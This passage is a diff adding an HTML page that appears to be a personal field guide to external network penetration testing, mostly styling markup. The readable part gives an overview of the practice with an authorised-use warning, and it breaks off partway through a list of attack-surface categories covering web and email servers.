@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>External Network Penetration Testing | Nisarg Chasmawala</title>
+<meta name="description" content="External Network Penetration Testing Methodology + AI Integration — by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;
+  --bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;
+  --mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;
+  --glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);
+  --cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);
+  --pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+
+/* ── BG LAYERS ── */
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+
+/* ── CURSOR ── */
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+
+/* ── PROGRESS ── */
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+
+/* ── TOPBAR ── */
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px;text-shadow:0 0 20px rgba(255,255,255,.2)}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+
+/* ── TOC ── */
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+
+/* ── WRAPPER ── */
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+
+/* ── HERO ── */
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(22px,4.2vw,50px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25),0 4px 0 rgba(0,200,50,.3)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:5px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}89%{transform:translate(5px,-2px);opacity:.7}91%{transform:translate(-3px,1px);opacity:.85}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}91%{transform:translate(-5px,-2px);opacity:.6}93%{transform:translate(3px,1px);opacity:.75}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+
+/* ── SECTIONS ── */
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.4vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+/* AI section styling */
+.sec-ai .sec-t{color:var(--p);text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:var(--p)}
+
+/* ── PANELS ── */
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s;transform-style:preserve-3d}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),inset 0 0 40px rgba(0,229,255,.025),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px) translateZ(6px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:var(--p)}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,var(--p),transparent)}
+
+/* ── VULN CARDS ── */
+.vgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(275px,1fr));gap:18px;margin-bottom:28px;perspective:1200px}
+.vc{background:rgba(191,0,255,.03);border:1px solid rgba(191,0,255,.15);border-radius:4px;padding:24px;position:relative;overflow:hidden;cursor:default;transform-style:preserve-3d;transition:box-shadow .25s;will-change:transform}
+.vc::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.04) 0%,transparent 50%);opacity:0;transition:opacity .25s}
+.vc::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(191,0,255,.25);border-left:32px solid transparent}
+.vc:hover::before{opacity:1}
+.vcn{font-family:var(--mono);font-size:44px;color:rgba(191,0,255,.09);position:absolute;top:6px;right:12px;line-height:1}
+.vcname{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--p);text-transform:uppercase;margin-bottom:10px}
+.vcdesc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.sev{display:inline-block;margin-top:12px;font-family:var(--mono);font-size:9px;letter-spacing:2px;padding:3px 10px;border-radius:2px;text-transform:uppercase}
+.sc{background:rgba(255,0,60,.1);color:var(--r);border:1px solid rgba(255,0,60,.28)}
+.sh{background:rgba(255,148,0,.08);color:#ff9400;border:1px solid rgba(255,148,0,.25)}
+.sm{background:rgba(255,215,0,.08);color:var(--o);border:1px solid rgba(255,215,0,.22)}
+
+/* ── TOOL CARDS ── */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin:20px 0;perspective:800px}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:20px;transition:all .25s;position:relative;overflow:hidden;transform-style:preserve-3d}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:5px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:8px;display:block}
+.tcdesc{font-size:13px;color:var(--t3);line-height:1.5}
+
+/* ── PHASE CARDS (red) ── */
+.atk{background:rgba(255,0,60,.03);border:1px solid rgba(255,0,60,.12);border-radius:4px;padding:28px;margin-bottom:24px;position:relative;overflow:hidden;transition:all .3s;transform-style:preserve-3d}
+.atk::before{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(255,0,60,.25);border-left:32px solid transparent}
+.atk::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,0,60,.03),transparent);opacity:0;transition:opacity .3s;pointer-events:none}
+.atk:hover{border-color:rgba(255,0,60,.4);box-shadow:0 0 60px rgba(255,0,60,.05),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.atk:hover::after{opacity:1}
+.atk-name{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--r);text-transform:uppercase;margin-bottom:14px}
+.atk-body{color:var(--t2);font-size:15px;margin-bottom:16px;line-height:1.75}
+
+/* ── AI CARDS ── */
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0;perspective:1000px}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s;transform-style:preserve-3d}
+.ai-card::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(191,0,255,.05),transparent);opacity:0;transition:opacity .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-card:hover::before{opacity:1}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--p);text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+
+/* ── PHASE TOOL TABLE ── */
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+
+/* ── CHECKLIST ── */
+.chk{list-style:none}
+.chk li{display:flex;align-items:flex-start;gap:12px;padding:11px 0;border-bottom:1px solid rgba(0,255,65,.05);font-size:14px;color:var(--t2);line-height:1.6}
+.chk li:last-child{border-bottom:none}
+.chk-i{flex-shrink:0;width:18px;height:18px;border:1px solid var(--g);border-radius:2px;display:flex;align-items:center;justify-content:center;margin-top:2px;background:rgba(0,255,65,.05)}
+.chk-i::after{content:'✓';font-size:10px;color:var(--g);font-family:var(--mono)}
+.chk li strong{color:var(--t1);font-weight:600}
+
+/* ── DEFENCE CARDS ── */
+.mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(255px,1fr));gap:16px;margin:20px 0}
+.mcard{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.12);border-radius:4px;padding:22px;transition:all .25s;position:relative;overflow:hidden}
+.mcard::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(0,229,255,.2);border-left:26px solid transparent}
+.mcard:hover{border-color:rgba(0,229,255,.4);box-shadow:var(--cglow),0 16px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.mcard-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--c);text-transform:uppercase;margin-bottom:10px}
+.mcard-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+
+/* ── ALERTS ── */
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid var(--p)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-i .al-ic{color:var(--c)}.al-p .al-ic{color:var(--p)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+
+/* ── 3-COL DEFENCE ── */
+.dgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-bottom:22px}
+@media(max-width:740px){.dgrid{grid-template-columns:1fr}}
+
+/* ── CODE BLOCKS ── */
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;transition:all .3s;cursor:pointer}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(to right,var(--g),transparent);opacity:0;transition:opacity .3s}
+.cb:hover{border-color:rgba(0,255,65,.35);box-shadow:0 0 30px rgba(0,255,65,.04)}
+.cb:hover::after{opacity:.5}
+.cb.cb-ai{border-left-color:var(--p)}
+.cb.cb-ai::before{color:var(--p);background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.cmd{color:var(--c)}.flag{color:var(--o)}.cmt{color:var(--t3)}.str{color:#ff79c6}.prm{color:#bd93f9}.kw{color:var(--r)}.fn{color:#8be9fd}
+
+/* ── CTA ── */
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'EXT';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:200px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;white-space:nowrap;letter-spacing:30px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+
+/* ── FOOTER ── */
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none;transition:text-shadow .2s}
+.f-r a:hover{text-shadow:var(--glow)}
+
+/* ── DIVIDER ── */
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.2),transparent)}
+.div-ai::after{background:var(--p);box-shadow:0 0 12px var(--p)}
+
+/* ── ANIMATIONS ── */
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+
+/* ── RESPONSIVE ── */
+@media(max-width:700px){.vgrid,.tgrid,.mgrid,.ai-grid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}.cta::before{font-size:80px}}
+</style>
+</head>
+<body>
+
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+
+<!-- ══ TOPBAR ══ -->
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles">
+      <span class="tb-inner">
+        Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp;
+        Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics
+      </span>
+    </div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+
+<!-- ══ TOC ══ -->
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#what')" data-s="what"><div class="toc-d"></div><span class="toc-l">OVERVIEW</span></div>
+  <div class="toc-i" onclick="goTo('#targets')" data-s="targets"><div class="toc-d"></div><span class="toc-l">ATTACK SURFACE</span></div>
+  <div class="toc-i" onclick="goTo('#planning')" data-s="planning"><div class="toc-d"></div><span class="toc-l">PHASE I — PLAN</span></div>
+  <div class="toc-i" onclick="goTo('#recon')" data-s="recon"><div class="toc-d"></div><span class="toc-l">PHASE II — RECON</span></div>
+  <div class="toc-i" onclick="goTo('#scan')" data-s="scan"><div class="toc-d"></div><span class="toc-l">PHASE III — SCAN</span></div>
+  <div class="toc-i" onclick="goTo('#exploit')" data-s="exploit"><div class="toc-d"></div><span class="toc-l">PHASE IV — EXPLOIT</span></div>
+  <div class="toc-i" onclick="goTo('#post')" data-s="post"><div class="toc-d"></div><span class="toc-l">PHASE V — POST</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+  <div class="toc-i" onclick="goTo('#defence')" data-s="defence"><div class="toc-d"></div><span class="toc-l">DEFENCE</span></div>
+</nav>
+
+<div class="wrap">
+
+<!-- ══════════════════════════════════ HERO ══════════════════════════════════ -->
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+
+  <h1 class="hero-title">
+    <div class="gw" data-t="EXTERNAL NETWORK">
+      <span class="ht-line1">EXTERNAL NETWORK</span>
+    </div>
+    <span class="ht-sub">PENETRATION TESTING + AI INTEGRATION — FIELD GUIDE</span>
+  </h1>
+
+  <p class="hero-desc">
+    A complete methodology for external network penetration testing — simulating real-world 
+    internet-based attacks against publicly facing infrastructure: web servers, email gateways, 
+    DNS, VPNs, APIs, and cloud assets. Includes a dedicated section on how AI is 
+    transforming both the attack and defence sides of external network security.
+  </p>
+
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">External Network · AI · Red Team</span></div>
+    <div class="m-item"><span class="m-lbl">Perspective</span><span class="m-val">Internet-Facing Infrastructure</span></div>
+  </div>
+
+  <div class="hero-scroll-hint">
+    <div class="hs-line"></div>
+    <span class="hs-txt">SCROLL TO BEGIN</span>
+    <div class="hs-pulse"></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 01 — OVERVIEW ══ -->
+<section class="sec rv" id="what">
+  <div class="sec-hd"><span class="sec-n">01 //</span><h2 class="sec-t">What is External Network Penetration Testing?<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p><strong style="color:var(--t1)">External network penetration testing</strong> is the practice of simulating a real-world internet-based attacker targeting an organisation's publicly reachable infrastructure — without any prior insider knowledge, credentials, or network access. The tester operates entirely from outside the organisation's perimeter, exactly as a threat actor would: using only publicly available information and tools to discover, enumerate, and exploit vulnerabilities in internet-facing systems.</p>
+    <p>This distinguishes it from internal pen testing (which assumes an attacker already inside the network) and makes it the most realistic simulation of the threat most organisations face day-to-day. Web servers, email infrastructure, DNS servers, VPN gateways, internet-facing APIs, and cloud service endpoints all fall within scope. A single exploitable vulnerability in any of these surfaces can be the entry point for a full organisational compromise.</p>
+  </div>
+
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ⚠ ]</span>
+    <p class="al-tx"><strong>Authorised Use Only.</strong> External penetration testing against targets you do not own or have explicit written permission to test is a serious criminal offence. Always obtain a signed Rules of Engagement document, define IP ranges and domain scope in writing, and confirm an escalation contact before any active testing begins.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Why External Pen Testing is Non-Negotiable</div>
+    <p>Internet-facing systems are under continuous automated attack — vulnerability scanners, credential stuffing bots, and opportunistic exploit scripts probe every public IP address within hours of it appearing online. Organisations that do not proactively test their external surface are effectively waiting to learn about their vulnerabilities through a breach notification rather than a penetration test report. The business case is straightforward: the cost of a structured test is orders of magnitude less than the cost of a breach affecting compliance, reputation, and customer trust.</p>
+    <p>Compliance frameworks reinforce this — PCI-DSS requires annual external penetration testing and testing after significant infrastructure changes. ISO 27001 mandates regular security assessments. GDPR implicitly requires demonstrable security testing as part of "appropriate technical measures." External pen testing satisfies all three simultaneously.</p>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 02 — EXTERNAL ATTACK SURFACE ══ -->
+<section class="sec rv" id="targets">
+  <div class="sec-hd"><span class="sec-n">02 //</span><h2 class="sec-t">External Attack Surface — Target Categories<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Before any testing begins, a complete external attack surface map must be built. Modern organisations have a far larger external footprint than they realise — shadow IT, forgotten subdomains, acquired company infrastructure, cloud misconfigurations, and development environments accidentally exposed to the internet all expand the surface beyond what appears in any internal asset register. Attack surface enumeration is itself a core deliverable of an external assessment.</p>
+  </div>
+
+  <div class="vgrid rv">
+    <div class="vc"><span class="vcn">01</span><div class="vcname">Web &amp; Application Servers</div><div class="vcdesc">Apache, Nginx, IIS, Tomcat — running web applications, APIs, admin panels, and content management systems. Web application vulnerabilities (SQLi, XSS, SSRF, RCE via file upload) are the single most common external exploitation path. Version disclosure in HTTP headers accelerates targeted CVE exploitation.</div><span class="sev sc">CRITICAL</span></div>
+    <div class="vc"><span class="vcn">02</span><div class="vcname">Email Infrastructure</div><div class="vcdesc">SMTP servers, webmail (OWA, Roundcube), mail relay configurations. Open relays enable spam abuse. Weak webmail credentials provide direct access to sensitive corporate correspondence. Misconfigured SPF, DKIM, and DMARC enable email spoofing attacks that are trivially weaponisable for phishing at scale.</div><span class="sev sh">HIGH</span></div>
